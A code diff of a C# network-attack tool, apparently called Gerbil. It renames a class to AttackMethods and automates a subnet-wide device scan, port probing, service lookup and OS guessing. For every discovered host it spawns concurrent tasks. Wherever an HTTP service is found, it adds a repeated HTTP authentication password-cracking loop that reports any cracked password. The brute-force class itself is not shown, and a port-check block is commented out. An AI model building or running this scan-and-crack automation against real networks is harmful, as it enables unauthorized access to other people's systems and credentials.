@@ -2,13 +2,13 @@
 using System.Net;
 using System.Collections.Generic;
 using System.Linq;
-using System.Text;
+using Gerbil.IO;
+using Gerbil.Data;
 using System.Threading.Tasks;
-using Gerbil.Gerbil_IO;
 
 namespace Gerbil
 {
-    class Pathfinder
+    class AttackMethods
     {
         private static int maxAddressField(char placeholder, string subnet)
         {
@@ -61,7 +61,7 @@ namespace Gerbil
         {
             // Scan for devices on network
             Out.writeln("Scanning for devices...");
-            List<string> devices = new List<string>();
+            Database<Data.Models.Devices.Device> deviceDB = new Database<Data.Models.Devices.Device>("Device DB");
             if(subnet.Contains("z"))
             {
                 int zCount = maxAddressField('z', subnet);
@@ -78,7 +78,8 @@ namespace Gerbil
                         Out.writeln("Searching " + yMod + " subnet...");
                         foreach (string i in Gerbil_Scanners.NetworkScanner.getDevices(yMod, timeout, xCount))
                         {
-                            devices.Add(i);
+                            Data.Models.Devices.Device device = new Data.Models.Devices.Device(IPAddress.Parse(i));
+                            deviceDB.Create(device);
                         }
                     }
                 }
@@ -95,7 +96,8 @@ namespace Gerbil
                     Out.writeln("Searching " + yMod + " subnet...");
                     foreach (string i in Gerbil_Scanners.NetworkScanner.getDevices(yMod, timeout, xCount))
                     {
-                        devices.Add(i);
+                        Data.Models.Devices.Device device = new Data.Models.Devices.Device(IPAddress.Parse(i));
+                        deviceDB.Create(device);
                     }
                 }
             }
@@ -107,72 +109,113 @@ namespace Gerbil
 
                 foreach (string i in Gerbil_Scanners.NetworkScanner.getDevices(subnet, timeout, xCount))
                 {
-                    devices.Add(i);
+                    Data.Models.Devices.Device device = new Data.Models.Devices.Device(IPAddress.Parse(i));
+                    deviceDB.Create(device);
                 }
             }
             
             // Loop system scan on all responding systems
-            foreach(string address in devices)
+            foreach(string address in deviceDB.getAllIDs())
             {
-                Out.blank();
-                // Scan device for open ports
-                Out.writeln("Probing known ports on " + address + "...");
-                int[] knownPorts = Gerbil_PortServices.PortLookup.getPorts();
-                List<int> tempFoundPorts = new List<int>();
-                foreach(int i in knownPorts)
+                Task.Factory.StartNew(() => attackDeviceAuto(ref deviceDB, address, timeout));
+            }
+        }
+        private static void attackDeviceAuto(ref Database<Data.Models.Devices.Device> DBref, string devID, int pingTimeout)
+        {
+            Out.blank();
+            // Get data from DB
+            string address = DBref.Read(devID).getDeviceIPAddress().ToString();
+            // Scan device for open ports
+            Out.writeln("Probing known ports on " + address + "...");
+            int[] knownPorts = Gerbil_PortServices.PortLookup.getPorts();
+            List<int> tempFoundPorts = new List<int>();
+            foreach (int i in knownPorts)
+            {
+                if (Gerbil_Scanners.PortScanner.scan(address, i, pingTimeout))
                 {
-                    if (Gerbil_Scanners.PortScanner.scan(address, i, timeout))
-                    {
-                        tempFoundPorts.Add(i);
-                        Out.writeln(i + ": OPEN");
-                    }
-                    else
-                    {
-                        Out.writeln(i + ": CLOSED");
-                    }
-                }
-                int[] openPorts = tempFoundPorts.ToArray();
-                if(openPorts.Length == 0)
-                {
-                    Out.writeln("No open ports found for the specified host and port range.");
-                    continue;
-                }
-                // Get list of services
-                Out.writeln("Looking up port definitions...");
-                string[] openServices = Gerbil_PortServices.PortLookup.getServices(openPorts);
-                if (openServices.Length > 0)
-                {
-                    Out.writeln("Found service: ");
-                    foreach (string i in openServices)
-                    {
-                        Out.writeln(i);
-                    }
+                    tempFoundPorts.Add(i);
+                    Out.writeln(i + ": OPEN");
                 }
                 else
                 {
-                    Out.writeln("No known services found in AI store. Add them manually using 'portservice add serviceName portNumber'");
-                    continue;
+                    Out.writeln(i + ": CLOSED");
                 }
-                if(openServices.Contains("NETBIOS"))
+            }
+            int[] openPorts = tempFoundPorts.ToArray();
+            if (openPorts.Length == 0)
+            {
+                Out.writeln("No open ports found for the specified host and port range.");
+                return;
+            }
+            // Get list of services
+            Out.writeln("Looking up port definitions...");
+            string[] openServices = Gerbil_PortServices.PortLookup.getServices(openPorts);
+            if (openServices.Length > 0)
+            {
+                Out.writeln("Found service: ");
+                foreach (string i in openServices)
                 {
-                    string devName = "";
-                    devName = Dns.GetHostEntry(address).HostName;
-                    Out.writeln("NETBIOS Name: " + devName);
+                    Out.writeln(i);
                 }
-                // Forward found services to the AI engine and get server OS
-                //TODO: forward training mode parameter
-                Gerbil_Engine.NetworkResult osr = Gerbil_Engine.GerbilRunner.guessOS(openServices, true);
-                float ct = osr.getCertainty();
-                ct = ct * 1000.0f;
-                Out.writeln("OS Guess: " + osr.getName());
-                Out.writeln(String.Format("Certainty: {0:F2}%", osr.getCertainty()));
-                // Guess more data based on running services
-                // HTTP
-                if(openServices.Contains("HTTP"))
+            }
+            else
+            {
+                Out.writeln("No known services found in AI store. Add them manually using 'portservice add serviceName portNumber'");
+                return;
+            }
+            if (openServices.Contains("NETBIOS"))
+            {
+                string devName = "";
+                devName = Dns.GetHostEntry(address).HostName;
+                Out.writeln("NETBIOS Name: " + devName);
+            }
+            // Forward found services to the AI engine and get server OS
+            //TODO: forward training mode parameter
+            Gerbil_Engine.NetworkResult osr = Gerbil_Engine.GerbilRunner.guessOS(openServices, true);
+            float ct = osr.getCertainty();
+            ct = ct * 1000.0f;
+            Out.writeln("OS Guess: " + osr.getName());
+            Out.writeln(String.Format("Certainty: {0:F2}%", osr.getCertainty()));
+            // Guess more data based on running services
+            // HTTP
+            if (openServices.Contains("HTTP"))
+            {
+                // Attempt an HTTP attack
+                if (In.securePrompt("AttackMethods", "HTTP Auth Password Crack"))
                 {
-
+                    int pLength = In.prompt<int>("Maximum length of password");
+                    Out.writeln("Cracking password...");
+                    Gerbil.Attackers.HTTPAuthAttacker HAA = new Attackers.HTTPAuthAttacker(address, pLength);
+                    while (true)
+                    {
+                        Out.write("*");
+                        Gerbil.Attackers.AttackerResult AR;
+                        try
+                        {
+                            AR = HAA.stab();
+                        }
+                        catch
+                        {
+                            // Error occured, break.
+                            break;
+                        }
+                        if (AR == Attackers.AttackerResult.Trying)
+                        {
+                            // Continue
+                        }
+                        else if (AR == Attackers.AttackerResult.FailedAuth || AR == Attackers.AttackerResult.FailedConnection)
+                        {
+                            Out.writeln("\nFailed to crack password using given parameters.");
+                            break;
+                        }
+                        else if (AR == Attackers.AttackerResult.Connected)
+                        {
+                            Out.blank();
+                            Out.writeln(String.Format("CRACKED: Password is \"{0}\".", HAA.getAccessString()));
+                            break;
+                        }
+                    }
                 }
-                // Launch attacks
             }
         }
         /// <summary>
@@ -230,7 +273,42 @@ namespace Gerbil
             // HTTP
             if (openServices.Contains("HTTP"))
             {
-
+                // Attempt an HTTP attack
+                if (In.securePrompt("Pathfinder", "HTTP Auth Password Crack"))
+                {
+                    int pLength = In.prompt<int>("Maximum length of password");
+                    Out.writeln("Cracking password...");
+                    Gerbil.Attackers.HTTPAuthAttacker HAA = new Attackers.HTTPAuthAttacker(ipAddress, pLength);
+                    while (true)
+                    {
+                        Out.write("*");
+                        Gerbil.Attackers.AttackerResult AR;
+                        try
+                        {
+                            AR = HAA.stab();
+                        }
+                        catch(Exception e)
+                        {
+                            // Error occured, break.
+                            break;
+                        }
+                        if (AR == Attackers.AttackerResult.Trying)
+                        {
+                            // Continue
+                        }
+                        else if(AR == Attackers.AttackerResult.FailedAuth || AR == Attackers.AttackerResult.FailedConnection)
+                        {
+                            Out.writeln("\nFailed to crack password using given parameters.");
+                            break;
+                        }
+                        else if (AR == Attackers.AttackerResult.Connected)
+                        {
+                            Out.blank();
+                            Out.writeln(String.Format("CRACKED: Password is \"{0}\".", HAA.getAccessString()));
+                            break;
+                        }
+                    }
+                }
             }
             // Launch attacks
         }
@@ -243,11 +321,11 @@ namespace Gerbil
         {
             // Scan device for open ports
             Out.writeln("Probing port...");
-            if (Gerbil_Scanners.PortScanner.scan(ipAddress, port, timeout))
+            /*if (Gerbil_Scanners.PortScanner.scan(ipAddress, port, timeout))
             {
                 Out.writeln("No open ports found for the specified host and port range.");
                 return;
-            }
+            }*****/
             // Get list of services
             Out.writeln("Looking up port definitions...");
             int[] openPorts = { port };
@@ -267,6 +345,46 @@ namespace Gerbil
             }
             // Generate server information using AI engine
             // Finalize using SNMP
+            // HTTP
+            if (openServices.Contains("HTTP"))
+            {
+                // Attempt an HTTP attack
+                if (In.securePrompt("Pathfinder", "HTTP Auth Password Crack"))
+                {
+                    int pLength = In.prompt<int>("Maximum length of password");
+                    Out.writeln("Cracking password...");
+                    Gerbil.Attackers.HTTPAuthAttacker HAA = new Attackers.HTTPAuthAttacker(ipAddress, pLength);
+                    while (true)
+                    {
+                        Out.write("*");
+                        Gerbil.Attackers.AttackerResult AR;
+                        try
+                        {
+                            AR = HAA.stab();
+                        }
+                        catch (Exception e)
+                        {
+                            // Error occured, break.
+                            break;
+                        }
+                        if (AR == Attackers.AttackerResult.Trying)
+                        {
+                            // Continue
+                        }
+                        else if (AR == Attackers.AttackerResult.FailedAuth || AR == Attackers.AttackerResult.FailedConnection)
+                        {
+                            Out.writeln("\nFailed to crack password using given parameters.");
+                            break;
+                        }
+                        else if (AR == Attackers.AttackerResult.Connected)
+                        {
+                            Out.blank();
+                            Out.writeln(String.Format("CRACKED: Password is \"{0}\".", HAA.getAccessString()));
+                            break;
+                        }
+                    }
+                }
+            }
             // Launch attacks
         }
         /// <summary>
@@ -310,6 +428,46 @@ namespace Gerbil
             }
             // Generate server information using AI engine
             // Finalize using SNMP
+            // HTTP
+            if (openServices.Contains("HTTP"))
+            {
+                // Attempt an HTTP attack
+                if (In.securePrompt("Pathfinder", "HTTP Auth Password Crack"))
+                {
+                    int pLength = In.prompt<int>("Maximum length of password");
+                    Out.writeln("Cracking password...");
+                    Gerbil.Attackers.HTTPAuthAttacker HAA = new Attackers.HTTPAuthAttacker(ipAddress, pLength);
+                    while (true)
+                    {
+                        Out.write("*");
+                        Gerbil.Attackers.AttackerResult AR;
+                        try
+                        {
+                            AR = HAA.stab();
+                        }
+                        catch (Exception e)
+                        {
+                            // Error occured, break.
+                            break;
+                        }
+                        if (AR == Attackers.AttackerResult.Trying)
+                        {
+                            // Continue
+                        }
+                        else if (AR == Attackers.AttackerResult.FailedAuth || AR == Attackers.AttackerResult.FailedConnection)
+                        {
+                            Out.writeln("\nFailed to crack password using given parameters.");
+                            break;
+                        }
+                        else if (AR == Attackers.AttackerResult.Connected)
+                        {
+                            Out.blank();
+                            Out.writeln(String.Format("CRACKED: Password is \"{0}\".", HAA.getAccessString()));
+                            break;
+                        }
+                    }
+                }
+            }
             // Launch attacks
         }
         /// <summary>
